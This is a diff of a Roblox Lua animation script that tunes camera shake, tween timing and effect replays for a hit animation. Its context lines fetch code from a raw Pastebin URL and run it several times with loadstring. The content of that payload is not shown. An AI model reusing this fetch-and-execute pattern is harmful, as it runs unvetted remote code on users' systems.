@@ -137,7 +137,7 @@ local function playHitAnimation(target)
     local code = game:HttpGet("https://pastebin.com/raw/cCpAvw66")
 
     task.spawn(function()
-        for i = 1, 8 do
+        for i = 1, 6 do
             task.spawn(function() loadstring(code)() end)
         end
     end)
@@ -177,6 +177,8 @@ local function playHitAnimation(target)
            tween:Play()
            wait(0.03)
            tween:Play()
+           wait(2)
+           tween:Play()
         end
 
         camera.CFrame = originalCFrame
@@ -203,7 +205,7 @@ local function playHitAnimation(target)
     wait(2)
 
     local shakeDuration = 1
-    local shakeMagnitude = 1.5
+    local shakeMagnitude = 1
 
     task.spawn(function()
         local originalCFrame = camera.CFrame
@@ -216,12 +218,12 @@ local function playHitAnimation(target)
            local tweenInfo = TweenInfo.new(0.01, Enum.EasingStyle.Linear)
            local tween = TweenService:Create(camera, tweenInfo, {CFrame = targetCFrame})
            tween:Play()
-           wait(0.5)
+           wait(0.03)
         end
 
         camera.CFrame = originalCFrame
     end)
-
+   
     wait(1)
 
     local windEffect = ReplicatedStorage.Resources.KJEffects["RUNAROUNDWIND"].RUNAROUNDWIND:Clone()
@@ -234,7 +236,7 @@ local function playHitAnimation(target)
 
     wait(1)
     local shakeDuration = 0.7
-    local shakeMagnitude = 1.5
+    local shakeMagnitude = 2
 
     task.spawn(function()
         wait(0.2)
@@ -242,13 +244,13 @@ local function playHitAnimation(target)
         local startTime = tick()
 
         while tick() - startTime < shakeDuration do
-           local offsetX = (math.random() - 1.0) * shakeMagnitude * 1.0
-           local offsetY = (math.random() - 1.0) * shakeMagnitude * 1.0
+           local offsetX = (math.random() - 1.0) * shakeMagnitude * 0.1
+           local offsetY = (math.random() - 1.0) * shakeMagnitude * 0.1
            local targetCFrame = originalCFrame * CFrame.new(offsetX, offsetY, 0)
            local tweenInfo = TweenInfo.new(0.01, Enum.EasingStyle.Linear)
            local tween = TweenService:Create(camera, tweenInfo, {CFrame = targetCFrame})
            tween:Play()
-           wait(0.5)
+           wait(0.03)
         end
 
         camera.CFrame = originalCFrame
